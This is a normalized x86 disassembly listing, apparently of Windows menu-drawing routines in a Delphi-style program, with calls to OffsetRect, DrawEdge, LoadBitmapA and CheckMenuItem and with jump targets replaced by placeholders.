mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b907
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_449e8c
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44adc8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44b920
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44c228
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d9bc
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41d618
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41ce24
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042f4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41d618
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d9bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_447bb4
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dd60
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d610
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d618
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d618
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d9bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d610
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4240cc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d5ec
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d9bc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d9bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44bd6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_423028
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41ce24
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_447bb4
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d618
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44adc8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41d0f0
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dd60
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41db40
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4480cc
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dd60
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d910
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41ce24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403198
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44adc8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c22f
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_449e8c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41dbc0
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_44adc8
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44c37c
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_44cd60
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_44c3ac
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_44c3f8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44c5da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403394
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_44c3ac
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_44cd60
mov esi eax
mov eax edi
call sub_44c37c
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4042f4
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402b98
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_403f80
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_449e8c
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4041f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c5e1
lea eax [ ebp - 0x24 ]
call sub_403ee8
lea eax [ ebp - 0x10 ]
call sub_403ee8
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_44adc8
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_44c60c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4042f4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403f3c
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44c634
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44c7a4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_44c7b4
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_44c67c
sub_44c67c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44ad38
push eax
call CheckMenuItem
mov eax esi
call sub_44c634
sub_44c6d0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_44c7a4
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
